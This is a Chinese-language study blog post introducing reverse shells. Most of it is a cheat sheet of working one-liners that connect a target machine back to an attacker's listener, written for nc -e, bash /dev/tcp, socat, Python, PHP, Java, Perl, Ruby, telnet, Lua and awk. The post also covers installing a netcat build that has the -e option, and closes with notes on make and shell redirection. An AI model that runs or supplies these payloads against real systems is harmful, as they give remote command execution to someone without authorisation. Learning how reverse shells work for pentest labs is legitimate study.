---
title: 初探反弹shell
date: 2023-04-02 08:09:27
tags:
  - 反弹shell
  - 常用命令
categories: 备忘录
keywords: 反弹shell
description: 本文记录了作者在反弹shell学习中面临的问题以及解决方案
top_img: https://pic.imgdb.cn/item/647c13aaf024cca173275063.png
cover: https://pic.imgdb.cn/item/647c13aaf024cca173275063.png
# password: xdxdsqyc15511551
# message: 暂未完成，仍在施工
---


## 反弹 shell 的概念

>反弹shell，就是攻击机监听在某个TCP/UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。

`Marcus_Holloway` 师傅在先知的文章是目前我见过写反弹 shell 最易懂的一篇，本文也是基于此篇文章，跟着师傅脚步做一个复现。

## nc 反弹 shell

nc 是 `Netcat` 的缩写，现目前各大 Linux 系统都默认安装有阉割版本的 Netcat 工具，出于安全考虑取消了 `-e` 参数，因此如果要使用 nc 来反弹 shell 还需要安装 `0.7.1` 版本的 nc 工具。

### netcat-0.7.1 安装步骤

执行以下命令：

``` bash
wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz # 下载安装包
tar -zxvf netcat-0.7.1.tar.gz && rm netcat-0.7.1.tar.gz                             # 解压压缩包并删除
mv netcat-0.7.1 /usr/local/netcat-0.7.1                                             # 将文件移动到 /usr/local 文件夹下
cd /usr/local/netcat-0.7.1                                                          # 进入安装目录
# 如果没有 gcc 环境需要先安装 gcc ：sudo apt install gcc
./configure                                                                         # 
make && make install                                                                # 
make clean                                                                          # 
vim ~/.bash_profile                                                                 # 修改环境变量
```

其中 `~/.bash_profile` 文件设置如下：

``` sh
# ser nercat_path
export NETCAT_HOME=/usr/local/netcat-0.7.1
export PATH=$PATH:$NETCAT_HOME/bin
```

关于 `CMake` 相关的解释请看下面的注解<sup>[【1】](#CMake-知识点)</sup>


安装完后输入 `nc -h` 检验，有 `-e` 参数说明安装成功了。

![netcat-0.7.1 安装成功](https://pic.imgdb.cn/item/647c13a1f024cca173273eea.png)

### nc 反弹 shell 命令

通过 `-e` 参数反弹 shell ：

``` bash
# 将[]换成自己的地址或端口
nc -e /bin/bash [LhostIP] [Port]      # 靶机
nc -lvvp [Port]                       # 攻击机
```

如图，已经反弹成功了：

![反弹成功](https://pic.imgdb.cn/item/647c13a1f024cca173273fb6.png)

## bash 一句话反弹

### 具体命令

``` bash
# 第一种
bash -i >& /dev/tcp/[LHostIP]/[Port] 0>&1
# 第二种
exec 5<>/dev/tcp/[LHostIP]/[Port];cat <&5 | while read line; do $line 2>&5 >&5; done
```

### bash 命令详解

第一条命令解释如下：

| 命令 | 解释 |
| ---- | ---- |
| `bash -i` | 产生一个 bash 交互环境 |
| `>&` | 将联合符号前面的内容与后面相结合，然后一起重定向给后者 |
| `/dev/tcp/[LHostIP]/[Port]` | 让靶机向攻击机建立 TCP 连接 |
| `0>&1` | 将标准输入与标准输出内容相结合，然后重定向给标准输出 |


>其实以上bash反弹一句完整的解读过程就是：
>
>bash 产生了一个交互环境与本地主机主动发起与目标主机 `[Port]` 端口建立的连接（即 `TCP [Port]` 会话连接）相结合，然后在重定向个 `tcp [Port]` 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。


第二条命令解释如下：

| 命令/符号 | 解释 |
| --- | --- |
| `exec 5<>/dev/tcp/[LHostIP]/[Port]` | 该命令会将文件描述符 5 与指定的 IP 地址和端口号建立 TCP 连接，使得通过文件描述符 5 读写的数据都会通过该连接传输。`[LHostIP]` 为本地主机的 IP 地址，`[Port]` 为本地主机监听的端口号。`<` 符号表示输入重定向，`>` 符号表示输出重定向。`&` 符号表示将文件描述符作为参数而不是文件名进行处理，`/dev/tcp/` 是一个特殊的文件系统，可以用于与其他主机进行网络通信。|
| `cat <&5` | 该命令会将文件描述符 5 的输入重定向到 `cat` 命令的标准输入上，使得通过该 TCP 连接传输的数据可以被 `cat` 命令读取。`<` 符号表示输入重定向。`&` 符号表示将文件描述符作为参数而不是文件名进行处理。 |
| `while read line; do $line 2>&5 >&5; done` | 该命令会不断读取 `cat` 命令的标准输入，将每一行数据存入变量 `line` 中，然后执行 `$line` 命令，将该命令的标准输出和标准错误输出都重定向到文件描述符 5 上，使得执行结果可以通过该 TCP 连接传输。`2>&5` 表示将标准错误输出重定向到文件描述符 5 上，`>&5` 表示将标准输出也重定向到文件描述符 5 上。`while` 循环会持续执行，直到 `cat` 命令的标准输入被关闭或者连接断开。|

关于 Linux 输入输出那些事，请看下文注解<sup>[【2】](#Linux-输入输出那些事)</sup>

反弹成功效果如下：

![反弹成功1](https://pic.imgdb.cn/item/647c13a2f024cca17327403b.png)
![反弹成功2](https://pic.imgdb.cn/item/647c13a2f024cca1732740ed.png)

## socat 反弹一句话

Socat 是 Linux 下的一个多功能的网络工具，名字来由是 Socket CAT 。其功能与有瑞士军刀之称的 Netcat 类似，可以看做是 Netcat 的加强版。

``` bash
# 攻击机
socat TCP-LISTEN:[Port] -
# 靶机
# linux
socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:[LHostIP]:[Port]
# windows
socat.exe exec:'cmd.exe',pty,stderr,setsid,sigint,sane tcp:[LHostIP]:[Port]
```

![socat TCP 反弹成功](https://pic.imgdb.cn/item/647c13a3f024cca173274190.png)

``` bash
# udp反弹
# 攻击机
  socat udp-listen:端口 -
# 靶机
# linux
socat udp-connect:[LHostIP]:[Port] exec:'bash -i',pty,stderr,sane 2>&1>/dev/null &
# windows
socat.exe udp-connect:[LHostIP]:[Port] exec:'cmd.exe',pty,stderr,sane
```

![socat udp 反弹成功](https://pic.imgdb.cn/item/647c13a3f024cca173274224.png)

## python 反弹一句话

``` bash
# 靶机
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LHostIP]",[Port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
# 如果是python3 
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LHostIP]",[Port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

实际上这段代码相当于执行了一个 python 脚本：

``` python
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("[LHostIP]",[Port]))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

![python 反弹成功](https://pic.imgdb.cn/item/647c13a3f024cca173274241.png)

## php 反弹一句话

``` bash
# 靶机
php -r '$sock=fsockopen("[LHostIP]",[Port]);exec("/bin/sh -i <&3 >&3 2>&3");'
```

实际上这段代码相当于执行了一个 php 脚本：

``` php
<?php
$sock=fsockopen("[LHostIP]",[Port]);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

![php 反弹一句话](https://pic.imgdb.cn/item/647c13a3f024cca1732742a1.png)

## JAVA 反弹

``` java
public class Revs {
/**
* @param args
* @throws Exception 
*/
public static void main(String[] args) throws Exception {
  // TODO Auto-generated method stub
  Runtime r = Runtime.getRuntime();
  String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/[LhostIP]/[Port];cat <&5 | while read line; do $line 2>&5 >&5; done"};
  Process p = r.exec(cmd);
  p.waitFor();
}
}
```

## Perl 反弹一句话

``` bash
perl -e 'use Socket;$i="[LHostIp]";$p=[Port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![Perl 反弹结果](https://pic.imgdb.cn/item/647c13a4f024cca1732743c7.png)

## Ruby 反弹一句话

``` bash
ruby -r socket -e 'exit if fork;c=TCPSocket.new("[LHostIp]","[Port]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Telnet 反弹一句话

``` bash
mknod backpipe p && telnet [LHostIp],[Port] 0<backpipe | /bin/bash 1>backpipe
```

![Telnet 反弹结果](https://pic.imgdb.cn/item/647c13a4f024cca17327443a.png)

## Lua 反弹一句话

``` bash
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('ip',port);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"
```

## awk 反弹一句话

``` bash
awk 'BEGIN{s="/inet/tcp/0/[LHostIp]/[Port]";while(1){do{s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit");close(s)}}'
```

![awk 反弹结果](https://pic.imgdb.cn/item/647c13a5f024cca17327450b.png)


## 注解

### CMake 知识点

用形象但不完全准确地话来描述 Linux 安装软件时的相关命令。

- `./configure` : 就是设计部出了一张设计稿，根据客户需要，符合各种要求。
- `make` : 就是前端组做好了模板。
- `make install` : 就是实施人员将模板上传至了后台，而且做了各种模板绑定，能真正看到实际展示效果。
- `make clean` : 清除编译产生的可执行文件及目标文件（ `object file` ，`*.o` ），也就是说 make 之后再来一条 make clean 就等于没有make过，这点在 make 出错时变得极为有用。
- `make distclean` : 这个就厉害了，它除了清除可执行文件和目标文件外，把 configure 所产生的 Makefile 也清除掉。运行过甚至相当于没有 configure 过。
- `make veryclean` : veryclean 是有多 clean？其实和 distclean 一样 clean。
- `make uninstall` : 虽然不是每个 sourcecode 包都有这个功能，但是这个东西确实是挺好的。想想看当你一时脑热直接 `./configure` 、`make` 、`make install` 之后，都不知道程序装去哪儿了，这时候就可以用这个进行卸载（当然 `uninstall` 只能执行1次，并且 sourcecode 目录中要有当前安装对应的 Makefile）。

关于 Linux 环境变量的设置，可以参考这篇 [文章](https://blog.csdn.net/Solomon1558/article/details/51763751) 。

### Linux 输入输出那些事

关于 shell 中的重定向、 `&>file` 、 `2>&1` 、`1>&2` 、`/dev/null` 的一些知识点：

1. Linux 中把所有设备全部视作文件，而在默认情况下，有三个文件始终处于打开状态：

| 类型 | 方式 | 文件描述符 |
| --- | --- | :---: |
| 标准输入 | 键盘输入 | 0 |
| 标准输出 | 输出到屏幕 | 1 |
|标准错误 |  输出到屏幕 | 2 |

2. 关于重定向：

| 命令              | 说明                                       |
| -----------------| -------------------------------------------|
| `command > file`   | 将输出重定向到 file                        |
| `command < file`   | 将输入重定向到 file                        |
| `command >> file`  | 将输出以追加的方式重定向到 file             |
| `n > file`         | 将文件描述符为 n 的文件重定向到 file       |
| `n >> file`        | 将文件描述符为 n 的文件以追加的方式重定向到 file |
| `n >& m`           | 将输出文件 m 和 n 合并                      |
| `n <& m`           | 将输入文件 m 和 n 合并                      |
| `<< tag`           | 将开始标记 tag 和结束标记 tag 之间的内容作为输入 |

3. 关于 `/dev/null/` ：

`/dev/null` 是一个特殊的设备文件，在类Unix操作系统中经常被用来丢弃不需要的输出或输入流。它是一个黑洞或空设备，任何写入它的数据都将被丢弃，而读取它则会立即返回 EOF（文件结束符）。

在 Linux 系统中，`/dev/null` 通常被用来丢弃不需要的输出。例如，当我们使用一个命令并希望将其输出丢弃而不是打印在屏幕上时，我们可以使用重定向将其输出重定向到 `/dev/null` 。例如，`command > /dev/null` 将会将 `command` 的标准输出（ `stdout` ）重定向到 `/dev/null` 中，从而丢弃输出。

类似地，当我们想要防止某些命令从标准输入（ `stdin` ）中读取数据时，我们可以将 `stdin` 重定向到 `/dev/null` ，例如 `command < /dev/null` 。这将使得 `command` 不会从 `stdin` 中读取任何输入数据。通常这种做法可以用来避免某些命令在等待输入时被阻塞，或者在不需要输入的情况下强制关闭标准输入。